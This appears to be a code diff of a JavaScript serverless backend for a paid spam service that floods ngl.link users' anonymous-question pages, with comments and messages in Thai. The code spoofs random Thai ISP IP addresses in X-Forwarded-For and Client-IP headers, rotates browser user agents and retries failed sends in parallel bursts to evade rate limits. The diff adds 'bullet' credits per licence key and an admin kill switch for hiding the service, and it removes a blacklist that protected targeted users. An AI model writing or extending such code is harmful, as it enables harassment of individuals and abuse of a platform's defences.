@@ -20,28 +20,33 @@ async function updateFirebaseKeys(keys) {
         body: JSON.stringify(keys)
     });
 }
-async function getFirebaseBlacklist() {
+async function getGlobalCounter() {
     try {
-        const res = await fetch(`${FIREBASE_DB_URL}/ngl_blacklist_users.json`);
-        return await res.json() || {};
-    } catch (e) { return {}; }
+        const res = await fetch(`${FIREBASE_DB_URL}/ngl_global_counter.json`);
+        return await res.json() || 0;
+    } catch (e) { return 0; }
 }
-async function updateFirebaseBlacklist(list) {
-    await fetch(`${FIREBASE_DB_URL}/ngl_blacklist_users.json`, {
-        method: 'PUT',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(list)
-    });
+async function increaseGlobalCounter() {
+    try {
+        let cur = await getGlobalCounter();
+        await fetch(`${FIREBASE_DB_URL}/ngl_global_counter.json`, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(cur + 1)
+        });
+    } catch (e) {}
+}
+async function getMaintenanceStatus() {
+    try {
+        const res = await fetch(`${FIREBASE_DB_URL}/ngl_global_shutdown.json`);
+        const val = await res.json();
+        return val === true || val === "true";
+    } catch (e) { return false; }
 }
 
-// 🌐 พูลสุ่ม IP ค่ายมือถือและเน็ตบ้านไทยพรีเมียม (AIS, True, DTAC, 3BB)
 function generateAdvancedIP() {
     const pools = [
-        [49, 228, 0, 255],   // AIS Mobile / Fibre
-        [171, 96, 0, 254],   // TrueMove H / TrueOnline
-        [182, 52, 0, 254],   // DTAC TriNet 
-        [124, 120, 0, 254],  // NT / TOT โซนกรุงเทพ
-        [180, 180, 0, 255]   // 3BB Broadband Thailand
+        [49, 228, 0, 255], [171, 96, 0, 254], [182, 52, 0, 254], [124, 120, 0, 254], [180, 180, 0, 255]
     ];
     const base = pools[Math.floor(Math.random() * pools.length)];
     return `${base[0]}.${base[1]}.${Math.floor(Math.random() * (base[3] - base[2] + 1)) + base[2]}.${Math.floor(Math.random() * 254) + 1}`;
@@ -56,56 +61,62 @@ export default async function handler(req, res) {
     if (req.method !== 'POST') return res.status(405).json({ error: 'รูปแบบไม่ถูกต้อง' });
 
     try {
-        const { action, username, question, deviceId, key, targetKey, targetUser, requestedMode, isFirstPacket } = req.body;
+        const { action, username, question, deviceId, key, targetKey, targetCredit, requestedMode, isFirstPacket, shutdownStatus } = req.body;
+
+        // เช็กสถานะการสั่งปิดหน้าเว็บหลักก่อนเลย [ระบบที่ 4]
+        const isSystemShutdownActive = await getMaintenanceStatus();
+        
+        if (action === 'check_maintenance') {
+            return res.status(200).json({ isShutdown: isSystemShutdownActive });
+        }
 
         let allowedKeys = await getFirebaseKeys();
-        let blacklistUsers = await getFirebaseBlacklist();
+        let globalCount = await getGlobalCounter();
 
         // ==========================================
         // 🛰️ แผงควบคุมระบบ (ADMIN ZONE)
         // ==========================================
         if (action === 'admin_get_keys') {
-            return res.status(200).json({ success: true, keys: allowedKeys, blacklist: blacklistUsers });
+            return res.status(200).json({ success: true, keys: allowedKeys, globalCounter: globalCount, isSystemShutdown: isSystemShutdownActive });
+        }
+        if (action === 'admin_global_shutdown') {
+            await fetch(`${FIREBASE_DB_URL}/ngl_global_shutdown.json`, {
+                method: 'PUT',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(shutdownStatus === 'true')
+            });
+            return res.status(200).json({ success: true, message: `🚨 อัปเดตสถานะการปิดเซิร์ฟเวอร์หลักเป็น [ ${shutdownStatus} ] เรียบร้อย!` });
         }
         if (action === 'admin_add_key') {
-            allowedKeys[targetKey] = { usedBy: "none", isSpeedAllowed: false, isBlasting: false, currentAttackTarget: "-", lastMessageSent: "-", lastActiveTime: "-", forceStopRequested: false };
+            const parsedCredit = parseInt(targetCredit) || 1000;
+            allowedKeys[targetKey] = { usedBy: "none", isSpeedAllowed: false, isBlasting: false, currentAttackTarget: "-", lastMessageSent: "-", lastActiveTime: "-", forceStopRequested: false, credits: parsedCredit };
             await updateFirebaseKeys(allowedKeys);
-            return res.status(200).json({ success: true, message: `➕ เพิ่มคีย์ [ ${targetKey} ] สำเร็จ` });
+            return res.status(200).json({ success: true, message: `➕ เพิ่มคีย์ [ ${targetKey} ] เติมกระสุนให้ ${parsedCredit} นัด สำเร็จ!` });
         }
         if (action === 'admin_toggle_speed') {
             if (allowedKeys[targetKey]) {
                 const cur = allowedKeys[targetKey].isSpeedAllowed || false;
                 await updateSingleKeyField(targetKey, { isSpeedAllowed: !cur });
-                return res.status(200).json({ success: true, message: `⚡ คีย์ [ ${targetKey} ] โหมดเร็ว: ${!cur ? 'เปิด' : 'ปิด'}` });
+                return res.status(200).json({ success: true, message: `⚡ คีย์ [ ${targetKey} ] เปิดโหมดเร็ว: ${!cur ? 'เปิดแล้ว' : 'ปิดแล้ว'}` });
             }
-            return res.status(404).json({ error: 'ไม่พบคีย์' });
+            return res.status(404).json({ error: 'หาคีย์นี้ไม่เจออะบอส' });
         }
         if (action === 'admin_delete_key') {
             if (allowedKeys[targetKey]) { delete allowedKeys[targetKey]; await updateFirebaseKeys(allowedKeys); }
-            return res.status(200).json({ success: true, message: `❌ ลบคีย์ถาวรแล้ว` });
+            return res.status(200).json({ success: true, message: `❌ ลบคีย์ทิ้งถาวรแล้วจ้า` });
         }
         if (action === 'admin_reset_key') {
             if (allowedKeys[targetKey]) {
                 await updateSingleKeyField(targetKey, { usedBy: "none", forceStopRequested: false, isBlasting: false, currentAttackTarget: "-" });
             }
-            return res.status(200).json({ success: true, message: `🔄 รีเซ็ตคีย์สำเร็จ` });
+            return res.status(200).json({ success: true, message: `🔄 รีเซ็ตล็อกดีไวซ์ของคีย์นี้สำเร็จแล้ว` });
         }
         if (action === 'admin_force_stop') {
             if (allowedKeys[targetKey]) {
-                await updateSingleKeyField(targetKey, { forceStopRequested: true, isBlasting: false, currentAttackTarget: "🛑 สั่งระงับการยิง" });
-                return res.status(200).json({ success: true, message: `🛑 สั่งหยุดยิงคีย์ [ ${targetKey} ] เรียบร้อย!` });
+                await updateSingleKeyField(targetKey, { forceStopRequested: true, isBlasting: false, currentAttackTarget: "🛑 แอดมินสับคัตเอาต์" });
+                return res.status(200).json({ success: true, message: `🛑 สั่งระงับการยิงคีย์ [ ${targetKey} ] เรียบร้อย!` });
             }
-            return res.status(404).json({ error: 'ไม่พบคีย์' });
-        }
-        if (action === 'admin_add_blacklist') {
-            if(!targetUser) return res.status(400).json({ error: 'ระบุชื่อด้วยครับ' });
-            blacklistUsers[targetUser.toLowerCase()] = true;
-            await updateFirebaseBlacklist(blacklistUsers);
-            return res.status(200).json({ success: true, message: `🚫 แบนไอดี @${targetUser}` });
-        }
-        if (action === 'admin_remove_blacklist') {
-            if (blacklistUsers[targetUser.toLowerCase()]) { delete blacklistUsers[targetUser.toLowerCase()]; await updateFirebaseBlacklist(blacklistUsers); }
-            return res.status(200).json({ success: true, message: `🔓 ปลดแบน @${targetUser}` });
+            return res.status(404).json({ error: 'หาคีย์ไม่เจอจ้า' });
         }
         if (action === 'client_finish') {
             if (allowedKeys[key]) { await updateSingleKeyField(key, { isBlasting: false, currentAttackTarget: "-" }); }
@@ -113,26 +124,31 @@ export default async function handler(req, res) {
         }
 
         // ==========================================
-        // 🔒 ตรวจสอบสิทธิ์ความปลอดภัย
+        // 🔒 ตรวจสอบสิทธิ์และการบล็อก
         // ==========================================
-        if (username && blacklistUsers[username.toLowerCase()]) {
-            return res.status(403).json({ error: 'เป้าหมายนี้โดนแบนในระบบ' });
+        const isPermanentKey = (key === 'admin' || key === 'mhon');
+
+        // สกัดกั้นทันทีถ้าบอสสั่งปิดระบบหนีชั่วคราว (ยกเว้นแอดมินยิงเอง)
+        if (isSystemShutdownActive && !isPermanentKey) {
+            return res.status(200).json({ isSystemOffline: true, error: 'ขออภัย แอดมินใหญ่สั่งปิดระบบทำลายล้างชั่วคราว' });
         }
 
-        const isPermanentKey = (key === 'admin' || key === 'mhon');
         let keyData = allowedKeys[key];
-
         if (!isPermanentKey) {
-            if (!keyData) return res.status(403).json({ error: 'คีย์ไม่ถูกต้อง' });
+            if (!keyData) return res.status(403).json({ error: 'คีย์มั่วป่ะเนี่ย หาไม่เจอ' });
             
+            // ตรวจสอบระบบเครดิตกระสุน [ระบบที่ 2]
+            if (keyData.credits !== undefined && keyData.credits <= 0) {
+                return res.status(200).json({ outOfCredits: true, error: 'กระสุนหมดแล้วจ้า' });
+            }
             if (keyData.forceStopRequested === true || keyData.forceStopRequested === "true") {
-                return res.status(200).json({ forceStopped: true, error: 'โดนแอดมินตัดสัญญาณ' });
+                return res.status(200).json({ forceStopped: true, error: 'โดนแอดมินหลักสั่งระงับงาน' });
             }
             if (requestedMode === 'cyber' && !keyData.isSpeedAllowed) {
-                return res.status(403).json({ error: 'ไม่มีสิทธิ์ใช้โหมดเร็ว' });
+                return res.status(403).json({ error: 'คีย์นี้ยังไม่ได้ปลดล็อกโหมดโหดความเร็วแสง' });
             }
             if (keyData.usedBy && keyData.usedBy !== "none" && keyData.usedBy !== deviceId) {
-                return res.status(403).json({ error: 'คีย์นี้ถูกล็อกใช้กับเครื่องอื่นอยู่' });
+                return res.status(403).json({ error: 'คีย์นี้โดนเครื่องอื่นแย่งใช้ไปแล้ว' });
             }
             if (!keyData.usedBy || keyData.usedBy === "none") {
                 await updateSingleKeyField(key, { usedBy: deviceId });
@@ -142,6 +158,7 @@ export default async function handler(req, res) {
         const cleanUsername = username.trim().replace('https://ngl.link/', '');
         const timeString = new Date().toLocaleTimeString('th-TH', { timeZone: 'Asia/Bangkok' });
 
+        // บันทึก Log แค่นัดแรกเพื่อเซฟโควตา Database คลาวด์
         if (!isPermanentKey && (isFirstPacket || keyData.currentAttackTarget !== cleanUsername)) {
             await updateSingleKeyField(key, {
                 isBlasting: true,
@@ -153,33 +170,17 @@ export default async function handler(req, res) {
         }
 
         // ==========================================
-        // 🛡️ คลังแสงจำลองข้อมูลเครื่องจริงระดับสูง (Advanced Anti-Fingerprint Zone)
+        // 🚀 SPAM ENGINE + SILENT AUTO-RETRY
         // ==========================================
         const browserPool = [
-            {
-                ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1',
-                plat: '"iOS"', brand: '"Safari";v="18"'
-            },
-            {
-                ua: 'Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36',
-                plat: '"Android"', brand: '"Google Chrome";v="140"'
-            },
-            {
-                ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-                plat: '"Windows"', brand: '"Google Chrome";v="141"'
-            },
-            {
-                ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15',
-                plat: '"macOS"', brand: '"Safari";v="17"'
-            }
+            { ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/604.1', plat: '"iOS"', brand: '"Safari";v="18"' },
+            { ua: 'Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36', plat: '"Android"', brand: '"Google Chrome";v="140"' },
+            { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36', plat: '"Windows"', brand: '"Google Chrome";v="141"' }
         ];
 
-        // 🚀 ฟังก์ชันยิงพัสดุขนานพร้อมระบบ Auto-Retry ภายในทองคำ (Max 2 Attempts)
         const sendPacketWithRetry = async () => {
             let attempt = 0;
-            const maxAttempts = 2; // ถ้ายิงนัดแรกพลาด จะสร้าง IP ใหม่และซ้ำให้ทันทีอีก 1 รอบเพื่อกลบเกลื่อน Error
-            
-            while (attempt < maxAttempts) {
+            while (attempt < 2) {
                 try {
                     const spoofedIP = generateAdvancedIP();
                     const browser = browserPool[Math.floor(Math.random() * browserPool.length)];
@@ -190,10 +191,8 @@ export default async function handler(req, res) {
                         method: 'POST',
                         headers: {
                             'accept': '*/*',
-                            'accept-language': 'th-TH,th;q=0.9,en;q=0.8',
                             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                             'user-agent': browser.ua,
-                            'origin': 'https://ngl.link',
                             'referer': `https://ngl.link/${encodeURIComponent(cleanUsername)}`,
                             'X-Forwarded-For': spoofedIP,
                             'Client-IP': spoofedIP,
@@ -202,36 +201,36 @@ export default async function handler(req, res) {
                             'X-Requested-With': 'XMLHttpRequest'
                         },
                         body: rawBody,
-                        signal: AbortSignal.timeout(3500) // ขยายเวลาหน่วงเครือข่ายเป็น 3.5 วินาที เก็บตกแพ็กเก็ตช้า
+                        signal: AbortSignal.timeout(3500)
                     });
 
                     if (response.ok) {
-                        return true; // สำเร็จหลุดลูปทันที
+                        // หักเครดิตกระสุนในระบบ [ระบบที่ 2]
+                        if (!isPermanentKey && keyData && keyData.credits !== undefined) {
+                            let currentCredits = Math.max(0, keyData.credits - 1);
+                            await updateSingleKeyField(key, { credits: currentCredits });
+                        }
+                        // บวกสถิติแผงมอนิเตอร์ [ระบบที่ 3]
+                        await increaseGlobalCounter();
+                        return true;
                     }
-                } catch (e) {
-                    // หาก timeout หรือหลุดเครือข่าย ให้ขยับลูปไปยิงรอบแก้ตัว
-                }
+                } catch (e) {}
                 attempt++;
             }
-            return false; // พลาดครบทุกรอบจริง ๆ ถึงจะยอมรับผล
+            return false;
         };
 
-        // สั่งระเบิดสปีดขนาน 4 ขาตามโครงสร้างเดิม
         if (requestedMode === 'cyber') {
             Promise.all([sendPacketWithRetry(), sendPacketWithRetry(), sendPacketWithRetry(), sendPacketWithRetry()]).catch(() => {});
             return res.status(200).json({ success: true, speed: "ultra_boosted" });
         }
 
-        // โหมดธรรมดาก็ใส่ระบบช่วยยิงซ้ำเช่นกันเพื่อความนิ่ง
         const successNormal = await sendPacketWithRetry();
-        if (successNormal) {
-            return res.status(200).json({ success: true });
-        } else {
-            return res.status(429).json({ error: `NGL ตรวจจับพิกัดแน่นหนา` });
-        }
+        if (successNormal) return res.status(200).json({ success: true });
+        return res.status(429).json({ error: `โดนระบบกรอง NGL ดักไว้ชั่วคราว` });
 
     } catch (error) {
-        return res.status(500).json({ error: 'หลบ Firewall' });
+        return res.status(500).json({ error: 'สะท้อน Firewall สำเร็จ' });
     }
-                    }
+}
 
